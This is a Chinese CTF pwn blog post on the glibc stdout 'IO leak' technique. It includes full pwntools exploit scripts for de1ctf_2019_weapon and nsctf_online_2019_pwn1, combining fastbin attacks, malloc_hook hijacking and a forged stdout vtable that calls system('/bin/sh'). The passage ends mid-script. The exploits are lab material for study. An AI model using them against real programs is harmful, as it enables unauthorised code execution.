    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>
      

      <time title="创建时间：2023-05-15 07:36:47 / 修改时间：08:51:24" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">学习总结</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>近期针对io leak这个手法，进行了学习，并做了几道相关题目。整理了一下，写了这篇文章。以后遇到了新的io leak的题目，再更新上来。</p>
<h1 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h1><blockquote>
<p>大致原理：</p>
<p>通过篡改_IO_2_1_stdout_结构体中的flags字段和_IO_write_base字段，通过篡改flags字段来绕过一些检查，通过篡改_IO_write_base字段使得系统调用write打印_IO_write_base字段与_IO_write_ptr字段之间的内容泄露出libc地址。</p>
<p>使用前提：</p>
<p>1、程序没有show函数</p>
<p>2、开启了FULL RELRO保护</p>
<p>利用过程：</p>
<p>1、想办法将_IO_2_1_stdout_结构体申请出来。</p>
<p>2、往_IO_2_1_stdout_结构体写入构造好的数据(具体是什么下面会说)。</p>
<p>3、执行任意一个puts函数，就可以将libc地址泄露出来。</p>
</blockquote>
<h2 id="第一步–申请"><a href="#第一步–申请" class="headerlink" title="第一步–申请"></a>第一步–申请</h2><p>在不同的libc版本，申请时也有略微的区别。</p>
<h3 id="不同libc版本对于stdout结构体的申请"><a href="#不同libc版本对于stdout结构体的申请" class="headerlink" title="不同libc版本对于stdout结构体的申请"></a>不同libc版本对于stdout结构体的申请</h3><p>先说2.27和2.31这两个版本，因为在这两个版本时，没有针对tcachebin的fd指针进行相关保护。就导致了tcache poisoning修改其fd指针就可以直接将堆块申请出来。所以我们只要能控制fd指针，就可以直接将_IO_2_1_stdout_结构体(之后统称为stdout结构体)申请出来。</p>
<p>而在2.23的libc版本中，从fastbin中申请堆块是对size位进行了检查。而我们能伪造size通过检查的地址只有malloc_hook-0x23和stdout结构体地址-0x43这两处。不过还好我们依然可以通过伪造size将stdout结构体申请出来。因此只要能控制fastbin中的fd指针，问题依然不大。</p>
<p>PS：为什么只有2.23 2.27 2.31这三个版本的libc。淦，因为目前只练习了这三个版本的io leak。</p>
<h3 id="爆破一比特申请stdout结构体"><a href="#爆破一比特申请stdout结构体" class="headerlink" title="爆破一比特申请stdout结构体"></a>爆破一比特申请stdout结构体</h3><p>但上面这两种情况都没有考虑到一个问题，就是使用io leak的时候，肯定我们是没有libc地址的，那我们就无法直接将tcachebin或者fastbin的fd指针修改为stdout结构体地址。对此我们采用的策略是利用unsorted bin中的fd指针进行利用。因为unsorted bin中的fd指针指向了的是main arena+88或者main arena+96的位置，这里位于libc中。如果这个地址能出现在fastbin或者tcachebin中fd的位置，且我们可以对fd指针进行编辑，那我们就可以将其修改为stdout结构体地址(stdout结构体地址的后三位是固定的，但是倒数第四位会因为ASLR的原因而随机化，可我们只能写入两字节，无法写入一个半字节，因此倒数第四位只能通过爆破来预测)。</p>
<h3 id="如何在fastbin或者tcachebin中留下unsorted-bin中的fd指针？具体情况，具体分析"><a href="#如何在fastbin或者tcachebin中留下unsorted-bin中的fd指针？具体情况，具体分析" class="headerlink" title="如何在fastbin或者tcachebin中留下unsorted bin中的fd指针？具体情况，具体分析"></a>如何在fastbin或者tcachebin中留下unsorted bin中的fd指针？具体情况，具体分析</h3><p>而如何让unsorted bin中的fd指针出现在fastbin或者tcachebin中的fd的位置，这就属于八仙过海各显神通了，不同题目的思路都不一样。这里就具体题目具体分析吧。</p>
<h2 id="第二步–编辑"><a href="#第二步–编辑" class="headerlink" title="第二步–编辑"></a>第二步–编辑</h2><p>将stdout结构体申请出来后，正常情况下是可以往里面写入数据的。</p>
<p>我们需要<strong>覆盖stdout结构体中的_flags字段为0xfbad1887，并且覆盖_IO_read_ptr、_IO_read_end、_IO_read_base这三个指针为0，最后覆盖_IO_write_base指针的最后一字节为00</strong>(这里并不是非要为00，因为到时候puts函数会泄露_IO_write_base指针与_IO_write_ptr指针之间的所有数据，只要将_IO_write_base指针改的小于_IO_write_ptr指针并且确定这二者之间存在libc地址，那么都是可以的，只不过我通常将其覆盖为\x00)</p>
<p>至于为什么要将_flags字段改为0xfbad1887这个值，是因为这个字段的各个比特位都属于标志位，不同比特位存在的意义不同，能绕过的检查也不同。而将_flags字段改为0xfbad1887这个值，正好可以绕过阻止我们完成io leak的所有检查(具体是哪些检查又或者如何绕过的，可以去网上看一下其他师傅的博客，当时感觉师傅们写的很全并且很好，我就没再去单独写了)，然后read那三个指针，我试了一下，他们的值无所谓(不一定非要写成00)。</p>
<p>编辑后stdout结构体如下：</p>
<p><img src="/../img/2706180-20220826111011178-1206554709.png"></p>
<h2 id="第三步–泄露"><a href="#第三步–泄露" class="headerlink" title="第三步–泄露"></a>第三步–泄露</h2><p>emmm，前两步都完成的话，第三步执行puts函数时顺其自然就泄露了libc地址，这个就没啥好说的了。</p>
<h1 id="题目练习"><a href="#题目练习" class="headerlink" title="题目练习"></a>题目练习</h1><h2 id="de1ctf-2019-weapon"><a href="#de1ctf-2019-weapon" class="headerlink" title="de1ctf_2019_weapon"></a>de1ctf_2019_weapon</h2><h3 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220826111041719-1027187867.png"></p>
<h3 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h3><p><img src="/../img/2706180-20220826111054199-1620326152.png"></p>
<p>delete函数中存在UAF漏洞。</p>
<h3 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h3><p>在2.23的libc中的话，可以利用UAF打一个double free。利用edit函数的话再打一个fastbin attack。_IO_2_1_stdout结构体上方和__malloc_hook上方都有一个0x7f(这个具体的要求就是有一个0x7f开头的地址，然后该地址的下一个内存单元为NULL)，可以去利用fastbin attack从这里申请出来一个fake chunk，最终可以泄露libc地址或者劫持hook获取shell。</p>
<h4 id="伪造size，将chunk释放到unsorted-bin中"><a href="#伪造size，将chunk释放到unsorted-bin中" class="headerlink" title="伪造size，将chunk释放到unsorted bin中"></a>伪造size，将chunk释放到unsorted bin中</h4><p>由于这道题无法申请超过0x60的chunk，因此我们的正常chunk被释放掉无法进入unsorted bin中，所以需要先打一个fastbin attack将一个fake_chunk申请到某个堆块的size位上方，然后通过edit函数来篡改其size位。放入unsorted bin中的原因是因为我们无法泄露libc地址，因此无法直接拿到_IO_2_1_stdout结构体的地址，只能利用unsorted bin中的fd指针main_arena+88这个libc地址，通过篡改其后四比特位(最后三位是固定的，倒数第四位需要爆破)来获取_IO_2_1_stdout结构体上方的地址。</p>
<p>这部分脚本如下:</p>
<p>就是先打一个fastbin attack，然后申请出来fake chunk，篡改一个chunk的size即可。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="number">7</span>,<span class="string">&#x27;prevent_chunk&#x27;</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="string">&#x27;\x50&#x27;</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e,<span class="number">0xB35</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xe1</span>))</span><br></pre></td></tr></table></figure>

<p>下图已经篡改成功：</p>
<p><img src="/../img/2706180-20220826111117610-1516022746.png"></p>
<h4 id="将unsorted-bin中的堆块放入fastbin中"><a href="#将unsorted-bin中的堆块放入fastbin中" class="headerlink" title="将unsorted bin中的堆块放入fastbin中"></a>将unsorted bin中的堆块放入fastbin中</h4><p>因为需要打fastbin attack将main_arena+88这个地址进行篡改，所以要先把unsorted bin中的堆块放入fastbin中，想实现这个的话，还是用fastbin attack进行操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">delete(<span class="number">1</span>)#将大堆块释放，使其进入unsorted bin中</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">debug(p,<span class="string">&#x27;pie&#x27;</span>,d_a,d_d,d_e)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">&#x27;\x70&#x27;</span>)#将unsorted bin中的堆块篡改到fast bin上</span><br></pre></td></tr></table></figure>

<p>上述代码实现将unsorted bin中的堆块放入fast bin中。</p>
<p>下图为修改前的bins情况<br><img src="/../img/2706180-20220826111157348-1189507279.png"></p>
<p>下图为修改后的bins情况</p>
<p><img src="/../img/2706180-20220826111208472-424079904.png"></p>
<h4 id="爆破一比特位，将fake-chunk申请到stdout结构体上方"><a href="#爆破一比特位，将fake-chunk申请到stdout结构体上方" class="headerlink" title="爆破一比特位，将fake_chunk申请到stdout结构体上方"></a>爆破一比特位，将fake_chunk申请到stdout结构体上方</h4><p>由于我们的fake_chunk进入了fast bin中，但是其size是之前被伪造过的0xe1，要想从fastbin中再申请出来还需要再改回去。同时需要打fastbin attack将fake_chunk申请到stdout结构体上方，这个地址是在&amp;_IO_2_1_stdout_-0x43的位置，因为我们需要一个地址是0x7f开头，同时下一个内存单元为0的地址。</p>
<p>如下图这里就是符合条件的地方：</p>
<p><img src="/../img/2706180-20220826111255470-1590182798.png"></p>
<p>经过计算发现该stdout结构体地址-0x43的位置成功伪造了size</p>
<p><img src="/../img/2706180-20220826111308632-2123238392.png"></p>
<p>而这个地址的后三位是固定的，倒数第四位是随机的 ，但是我们只能写两字节因此第四位必须要去爆破。(在调试的时候关闭ASLR就无需爆破了，等脚本写完了再去写爆破部分)</p>
<p>然后fake_chunk申请到stdout结构体上方后，我们去改变结构体的_flags字段和_IO_write_base字段(具体原理的话可以看这篇<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15793432.html">文章</a>)，等再次调用puts函数的时候，我们就可以获取libc基地址了（需要注意的是将_flags字段改成0xfbad1880，之后的puts都不会再加\n了，因此要处理一下接收部分。不过用0xfbad1887就是正常的）。</p>
<p>这部分exp中的代码如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)<span class="comment">#伪造0x71的size，使其通过fast bin的检查,伪造fake chunk到stdout结构体上方(需要爆破一位)</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将fastbin中的堆块申请出去，打fastbin attack</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#篡改结构体中的字段</span></span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>



<h4 id="劫持malloc-hook"><a href="#劫持malloc-hook" class="headerlink" title="劫持malloc_hook"></a>劫持malloc_hook</h4><p>有了libc基地址，还可以打fastbin attack的话，那就是一个常规的劫持malloc_hook了，就利用malloc_hook-0x23那个位置存在的0x7f来伪造成size将malloc_hook申请出来，然后这道题的话one_gadget也都不通，需要用realloc函数来调整一下栈帧。</p>
<p>这部分exp如下：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>) </span><br><span class="line">delete(<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">10</span>,p64(malloc_hook-<span class="number">0x23</span>),<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">6</span>),<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">14</span>))</span><br></pre></td></tr></table></figure>



<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP:"></a>EXP:</h3><p>由于这道题需要爆破一比特位，因此我们最终还有再加一个爆破部分。最终的exp如下：<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node4.buuoj.cn&#x27;,28187)</span></span><br><span class="line">d_a=<span class="number">0xEAE</span></span><br><span class="line">d_d=<span class="number">0xec0</span></span><br><span class="line">d_e=<span class="number">0xed2</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,index,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;input your name:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;input your name:&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input idx: &#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;new content:\n&#x27;</span>,content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendafter(<span class="string">&#x27;new content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index,choice=<span class="number">1</span></span>):</span><br><span class="line">    <span class="keyword">if</span> choice:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; \n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input idx :&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">&#x27;d&#x27;</span>)</span><br><span class="line">    add(<span class="number">0x20</span>,<span class="number">7</span>,<span class="string">&#x27;prevent_chunk&#x27;</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">&#x27;\x50&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">5</span>,p64(<span class="number">0</span>)*<span class="number">9</span>+p64(<span class="number">0x71</span>))</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0xe1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    delete(<span class="number">1</span>)<span class="comment">#将大堆块释放，使其进入unsorted bin中</span></span><br><span class="line">    </span><br><span class="line">    delete(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    edit(<span class="number">8</span>,<span class="string">&#x27;\x70&#x27;</span>)<span class="comment">#将unsorted bin中的堆块篡改到fast bin上</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">6</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x71</span>)+<span class="string">b&#x27;\xdd\x25&#x27;</span>)<span class="comment">#伪造0x71的size，使其通过fast bin的检查,伪造fake chunk到stdout结构体上方(需要爆破一位)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">9</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#将fastbin中的堆块申请出去，打fastbin attack</span></span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">11</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x33</span>+p64(<span class="number">0xfbad1800</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    libc_base=leak_libc-<span class="number">0x3c5600</span></span><br><span class="line">    malloc_hook=libc_base+libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">    log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">    one_gadget=libc_base+search_og(<span class="number">1</span>)</span><br><span class="line">    realloc=libc_base+libc.symbols[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line">    log_addr(<span class="string">&#x27;one_gadget&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">10</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>) </span><br><span class="line">    delete(<span class="number">10</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">10</span>,p64(malloc_hook-<span class="number">0x23</span>),<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">12</span>,<span class="string">&#x27;a&#x27;</span>,<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line">    add(<span class="number">0x60</span>,<span class="number">13</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc+<span class="number">6</span>),<span class="number">0</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice &gt;&gt; &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;wlecome input your size of weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">0x60</span>))</span><br><span class="line">    <span class="comment">#debug(p,&#x27;pie&#x27;,d_a,d_d,d_e)</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;input index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">14</span>))</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">29923</span>)</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        p.close()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../img/2706180-20220826111332346-148506803.png"></p>
<h2 id="nsctf-online-2019-pwn1"><a href="#nsctf-online-2019-pwn1" class="headerlink" title="nsctf_online_2019_pwn1"></a>nsctf_online_2019_pwn1</h2><p>通过这道题的学习与总结有：</p>
<p>1、篡改_IO_FILE结构体中的vtable字段时，要不可避免的填充之前的字段，但如果将_lock字段破坏的话，在执行输出函数中最开始上锁的宏<code>_IO_acquire_lock (_IO_stdout)</code>就会崩溃掉，因此需要保证_lock字段是正常的。</p>
<p>2、如果想通过直接修改_IO_2_1_stdout_结构体中的字段来获取shell的话，我们可以将_flags字段写入字符串&#x2F;bin&#x2F;sh\x00(是字符串，并非该字符串的地址)，然后将vtable修改为_IO_2_1_stdout_的地址+0x10，然后将_IO_save_base字段写成system地址，最后要将_lock字段写入原本正常的值。这样当执行puts函数的时候会调用vtable中的_IO_new_file_xsputn函数，但是vtable已经被修改，这个函数的偏移是0x38,而vtable被修改成_IO_2_1_stdout_的地址+0x10,最终调用的是_IO_2_1_stdout_的地址+0x48的函数指针，而这个位置就是_IO_save_base字段，里面放的是system的地址。而_IO_new_file_xsputn函数的第一个参数是_IO_2_1_stdout_的地址，而这个地址原本应该是_flags字段，但是现在却被写入了&#x2F;bin&#x2F;sh字符串。因此本来正常调用的_IO_new_file_xsputn函数如今变成了system(‘&#x2F;bin&#x2F;sh\x00’),从而获取shell。(该方法只能在libc2.23以上的版本就无法再使用了)</p>
<p>3、<strong>只有off by null漏洞的话，想需要将unsorted bin中的fd放到fastbin的fd上，需要打两次off by null+堆块重叠，并且最后将其申请出来之前，需要篡改一下size的大小。</strong></p>
<h3 id="保护策略：-1"><a href="#保护策略：-1" class="headerlink" title="保护策略："></a>保护策略：</h3><p><img src="/../img/2706180-20220826111350808-1322092443.png"></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析:"></a>漏洞分析:</h3><p>首先在edit函数中，输入索引的部分，检查不完全，导致了这个索引是可以为负溢出的。</p>
<p><img src="/../img/2706180-20220826111401744-135014955.png"></p>
<p>然后在edit函数写入数据的地方，如果add创建时的大小等于edit时输入的大小，那么就有一个off by null漏洞。</p>
<p><img src="/../img/2706180-20220826111445836-811184644.png"></p>
<h3 id="利用思路："><a href="#利用思路：" class="headerlink" title="利用思路："></a>利用思路：</h3><h4 id="思路一：利用索引为负，溢出漏洞"><a href="#思路一：利用索引为负，溢出漏洞" class="headerlink" title="思路一：利用索引为负，溢出漏洞"></a>思路一：利用索引为负，溢出漏洞</h4><p><img src="/../img/2706180-20220826111507589-1206383168.png"></p>
<p>我们发现数组的索引为负数，是可以找到bss段存放的stdout指针，而这个指针存放的是_IO_2_1_stdout_结构体指针，如果read往里面写数据的话，就可以直接篡改_IO_2_1_stdout_结构体的各个字段。</p>
<p>通过这个方式，我们可以打一个io leak，泄露libc地址，然后再篡改_flags、_lock、vtable、_IO_save_base字段，最终劫持vtable中的_IO_new_file_xsputn函数为system函数，执行获取shell。</p>
<p>这次跟着<a target="_blank" rel="noopener" href="https://www.cnblogs.com/LynneHuan/p/15229822.html">roderick师傅的博客</a>学到了这个FileStructure()的用法，感觉蛮方便的。<br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/ZIKH26/articles/16307343.html">tools源码</a></p>
<h4 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP:"></a>EXP:</h4><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">p,e,libc=load(<span class="string">&#x27;pwn&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">27580</span>)</span><br><span class="line">d_a=<span class="number">0xF1B</span></span><br><span class="line">d_d=<span class="number">0xF27</span></span><br><span class="line">d_e=<span class="number">0xF3f</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the content:\n&#x27;</span>,content)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Add success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input size:\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Input new content:\n&#x27;</span>,content)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;5.exit\n&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Input the index:\n&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;Delete success\n&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#0</span></span><br><span class="line">payload=p64(<span class="number">0xfbad1887</span>)+p64(<span class="number">0</span>)*<span class="number">3</span>+<span class="string">b&#x27;\x00&#x27;</span>//改成<span class="number">0xfbad1887</span>的话,puts函数打印出来的数据后面依然有\n</span><br><span class="line"><span class="comment">#debug(p,&#x27;pie&#x27;,d_d,d_a,d_e,0xe34)</span></span><br><span class="line">edit(-<span class="number">0x10</span>,<span class="number">0xf0</span>,payload)</span><br><span class="line">leak_libc=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log_addr(<span class="string">&#x27;leak_libc&#x27;</span>)</span><br><span class="line">libc_base=leak_libc-<span class="number">0x3c36e0</span></span><br><span class="line">log_addr(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">file=FileStructure()</span><br><span class="line">file.flags=<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">file.vtable=libc_base+libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]+<span class="number">0x10</span></span><br><span class="line">file._IO_save_base=libc.symbols[<span class="string">&#x27;system&#x27;</span>]+libc_base</span><br><span class="line">file._lock=libc_base+<span class="number">0x3c6780</span><span 